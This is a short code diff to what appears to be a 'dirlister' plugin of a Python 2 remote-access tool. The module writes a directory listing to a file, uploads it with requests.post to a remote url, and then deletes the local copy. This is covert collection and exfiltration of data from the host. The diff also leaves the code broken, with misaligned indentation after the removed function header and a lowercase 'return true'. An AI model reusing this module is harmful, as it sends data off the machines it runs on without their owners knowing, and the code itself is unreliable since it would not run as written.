@@ -5,11 +5,6 @@ import threading
 
 
 def run(**args):
-   scandir()
-   return True
-
-def scandir():
-    
     print "[*] In dirlister module."
     hit = ""
     f_des = open("dirmodule.lst" , "w")
@@ -30,5 +25,5 @@ def scandir():
     r = requests.post(url, files=files)	  
     os.remove("dirmodule.lst")
     print "dir module sent"
-    
+    return true    
 #run()
